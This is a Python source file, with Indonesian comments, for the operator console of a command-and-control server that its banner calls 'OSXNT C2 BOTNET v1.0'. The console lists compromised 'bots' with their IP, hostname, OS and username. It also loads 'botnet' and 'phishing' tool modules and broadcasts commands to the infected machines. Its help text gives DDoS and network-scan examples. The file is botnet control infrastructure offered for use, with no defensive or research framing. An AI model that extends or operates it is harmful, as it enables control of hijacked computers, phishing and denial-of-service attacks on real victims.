#!/usr/bin/env python3
# OSXNT - C2 User Interface
# ASCII UI dengan command parser

import os
import sys
import time
from datetime import datetime

class C2UI:
    """
    User Interface untuk C2 Server
    Dengan ASCII banner dan command parser
    """
    
    def __init__(self, server, monitor):
        """
        Inisialisasi UI
        
        Args:
            server: C2Server instance
            monitor: C2Monitor instance
        """
        self.server = server
        self.monitor = monitor
        self.running = False
        self.prompt = "root@{}> "
        
        # Command registry
        self.commands = {
            'help': self.cmd_help,
            'h': self.cmd_help,
            '?': self.cmd_help,
            
            'list': self.cmd_list,
            'ls': self.cmd_list,
            
            'show': self.cmd_show,
            
            'add': self.cmd_add,
            
            'exec': self.cmd_exec,
            'run': self.cmd_exec,
            
            'monitor': self.cmd_monitor,
            'stats': self.cmd_monitor,
            
            'broadcast': self.cmd_broadcast,
            'bc': self.cmd_broadcast,
            
            'clear': self.cmd_clear,
            'cls': self.cmd_clear,
            
            'exit': self.cmd_exit,
            'quit': self.cmd_exit,
            'q': self.cmd_exit
        }
    
    def start(self):
        """
        Start UI loop
        """
        self.running = True
        self._show_banner()
        
        while self.running:
            try:
                # Get prompt ID
                prompt_id = self.server.bot_id_counter if hasattr(self.server, 'bot_id_counter') else 1
                cmd = input(self.prompt.format(prompt_id)).strip()
                
                if cmd:
                    self._parse_command(cmd)
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"UI Error: {e}")
    
    def _show_banner(self):
        """
        Tampilkan ASCII banner
        """
        banner = f"""
╔══════════════════════════════════════════════════════════╗
║                   OSXNT C2 BOTNET v1.0                   ║
║                 Command & Control Framework               ║
╚══════════════════════════════════════════════════════════╝

Server: {self.server.ip}:{self.server.port} | Status: 🟢 ONLINE
Bots Connected: {len(self.server.bots)} | Tools Loaded: {len(self.server.tools)}

Type 'help' for available commands
"""
        print(banner)
    
    def _parse_command(self, cmd_line):
        """
        Parse dan execute command
        
        Args:
            cmd_line: string command
        """
        parts = cmd_line.split()
        if not parts:
            return
        
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if cmd in self.commands:
            try:
                self.commands[cmd](args)
            except Exception as e:
                print(f"Error executing command: {e}")
        else:
            print(f"Unknown command: {cmd}. Type 'help'")
    
    def cmd_help(self, args):
        """
        Show help menu
        """
        help_text = """
📚 AVAILABLE COMMANDS
======================

🖥️  GENERAL:
  help, h, ?            - Show this help
  clear, cls            - Clear screen
  exit, quit, q         - Exit C2 server

🤖 BOT MANAGEMENT:
  list bots             - List all connected bots
  list tools            - List loaded tools
  show bot <id>         - Show bot details
  show tool <name>      - Show tool details

📦 TOOL MANAGEMENT:
  add tools -botnet codes=<file1,file2> config=<config_file>
                        - Add botnet tools
  add tools -phishing codes=<file>
                        - Add phishing tools

⚡ EXECUTION:
  exec <tool> <cmd>     - Execute tool on all bots
  exec bot <id> <tool> <cmd>
                        - Execute tool on specific bot
  broadcast <message>   - Send message to all bots

📊 MONITORING:
  monitor, stats        - Show monitoring dashboard

Examples:
  list bots
  show bot BOT-001
  add tools -botnet codes=./mybot.py config=./config.json
  exec scanner scan 192.168.1.0/24
  exec bot BOT-001 ddos --target 10.0.0.1
  broadcast "update config"
"""
        print(help_text)
    
    def cmd_list(self, args):
        """
        List bots atau tools
        """
        if not args:
            print("Usage: list [bots|tools]")
            return
        
        target = args[0].lower()
        
        if target == 'bots':
            self._list_bots()
        elif target == 'tools':
            self._list_tools()
        else:
            print(f"Unknown list target: {target}")
    
    def _list_bots(self):
        """
        List semua connected bots
        """
        if not self.server.bots:
            print("No bots connected")
            return
        
        print("\n🤖 CONNECTED BOTS")
        print("=" * 60)
        print(f"{'ID':<10} {'IP':<15} {'Hostname':<20} {'Status':<10} {'Last Seen':<15}")
        print("-" * 60)
        
        for bot_id, bot in self.server.bots.items():
            status_icon = '🟢' if bot.get('status') == 'active' else '🔴'
            last_seen = datetime.fromtimestamp(bot.get('last_seen', 0)).strftime('%H:%M:%S')
            
            print(f"{bot_id:<10} {bot.get('ip', 'unknown'):<15} "
                  f"{bot.get('hostname', 'unknown')[:20]:<20} "
                  f"{status_icon} {bot.get('status', 'unknown'):<8} "
                  f"{last_seen:<15}")
        
        print("=" * 60)
    
    def _list_tools(self):
        """
        List loaded tools
        """
        if not hasattr(self.server, 'tools') or not self.server.tools:
            print("No tools loaded")
            return
        
        print("\n📦 LOADED TOOLS")
        print("=" * 60)
        
        for tool_name, tool_obj in self.server.tools.items():
            tool_file = getattr(tool_obj, '__file__', 'unknown')
            print(f"  📌 {tool_name}")
            print(f"     File: {tool_file}")
            print()
    
    def cmd_show(self, args):
        """
        Show detail of bot or tool
        """
        if len(args) < 2:
            print("Usage: show [bot|tool] <id/name>")
            return
        
        target_type = args[0].lower()
        target_id = args[1]
        
        if target_type == 'bot':
            self._show_bot(target_id)
        elif target_type == 'tool':
            self._show_tool(target_id)
        else:
            print(f"Unknown show target: {target_type}")
    
    def _show_bot(self, bot_id):
        """
        Show detailed bot info
        """
        if bot_id not in self.server.bots:
            print(f"Bot {bot_id} not found")
            return
        
        bot = self.server.bots[bot_id]
        
        print(f"\n🤖 BOT DETAILS: {bot_id}")
        print("=" * 50)
        print(f"ID:          {bot.get('id')}")
        print(f"IP:          {bot.get('ip')}")
        print(f"Port:        {bot.get('port')}")
        print(f"Hostname:    {bot.get('hostname')}")
        print(f"OS:          {bot.get('os')}")
        print(f"Username:    {bot.get('username')}")
        print(f"Status:      {'🟢 ACTIVE' if bot.get('status') == 'active' else '🔴 INACTIVE'}")
        print(f"Connected:   {datetime.fromtimestamp(bot.get('connected_at', 0)).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Last Seen:   {datetime.fromtimestamp(bot.get('last_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Tasks:       {len(bot.get('tasks', []))}")
        print("=" * 50)
    
    def _show_tool(self, tool_name):
        """
        Show detailed tool info
        """
        if tool_name not in self.server.tools:
            print(f"Tool {tool_name} not found")
            return
        
        tool = self.server.tools[tool_name]
        
        print(f"\n📦 TOOL DETAILS: {tool_name}")
        print("=" * 50)
        print(f"Name:        {tool_name}")
        print(f"File:        {getattr(tool, '__file__', 'unknown')}")
        print(f"Functions:   {[f for f in dir(tool) if not f.startswith('_')]}")
        
        # Cek help function
        if hasattr(tool, 'help'):
            print(f"\n{tool.help()}")
    
    def cmd_add(self, args):
        """
        Add tools dari user
        """
        if len(args) < 3:
            print("Usage: add tools -botnet codes=<file1,file2> config=<config_file>")
            print("       add tools -phishing codes=<file>")
            return
        
        tool_type = args[1].lower()  # -botnet atau -phishing
        if tool_type not in ['-botnet', '-phishing']:
            print("Tool type must be -botnet or -phishing")
            return
        
        # Parse parameters
        params = {}
        for arg in args[2:]:
            if '=' in arg:
                key, value = arg.split('=', 1)
                params[key] = value
        
        if 'codes' not in params:
            print("Missing 'codes' parameter")
            return
        
        # Panggil tool manager
        from .tool.tool_support import ToolManager
        tm = ToolManager('modules/c2/tool')
        
        code_files = params['codes'].split(',')
        config_file = params.get('config')
        
        success, message = tm.load_tool(
            tool_type.replace('-', ''),
            code_files,
            config_file
        )
        
        if success:
            # Update server tools
            for name, tool in tm.tools.items():
                self.server.tools[name] = tool
            print(f"✅ {message}")
        else:
            print(f"❌ {message}")
    
    def cmd_exec(self, args):
        """
        Execute tool on bots
        """
        if not args:
            print("Usage: exec <tool> <command>")
            print("       exec bot <id> <tool> <command>")
            return
        
        # Check if targeting specific bot
        if args[0].lower() == 'bot' and len(args) >= 4:
            bot_id = args[1]
            tool_name = args[2]
            command = ' '.join(args[3:])
            
            # Execute on specific bot
            from .tool.tool_support import ToolManager
            tm = ToolManager('modules/c2/tool')
            
            bot_context = self.server.bots.get(bot_id, {})
            success, result = tm.execute_tool(tool_name, command, bot_context)
            
            if success:
                print(f"✅ Bot {bot_id} executed: {result}")
            else:
                print(f"❌ {result}")
        
        else:
            # Execute on all bots
            tool_name = args[0]
            command = ' '.join(args[1:]) if len(args) > 1 else ''
            
            from .tool.tool_support import ToolManager
            tm = ToolManager('modules/c2/tool')
            
            if tool_name not in self.server.tools:
                print(f"Tool {tool_name} not loaded")
                return
            
            print(f"📢 Broadcasting to {len(self.server.bots)} bots...")
            
            for bot_id, bot_info in self.server.bots.items():
                if bot_info.get('status') == 'active':
                    bot_context = bot_info
                    success, result = tm.execute_tool(tool_name, command, bot_context)
                    
                    status = '✅' if success else '❌'
                    print(f"  {status} {bot_id}: {result if success else result}")
    
    def cmd_broadcast(self, args):
        """
        Broadcast message to all bots
        """
        if not args:
            print("Usage: broadcast <message>")
            return
        
        message = ' '.join(args)
        results = self.server.broadcast_command('message', {'text': message})
        
        print(f"📢 Broadcast to {len(results)} bots:")
        for result in results:
            icon = '✅' if result['success'] else '❌'
            print(f"  {icon} {result['bot_id']}: {result['message']}")
    
    def cmd_monitor(self, args):
        """
        Show monitoring dashboard
        """
        if not hasattr(self, 'monitor'):
            print("Monitor not initialized")
            return
        
        self.monitor.show_dashboard()
    
    def cmd_clear(self, args):
        """
        Clear screen
        """
        os.system('cls' if os.name == 'nt' else 'clear')
        self._show_banner()
    
    def cmd_exit(self, args):
        """
        Exit C2 server
        """
        print("\nShutting down C2 server...")
        self.server.stop()
        self.running = False
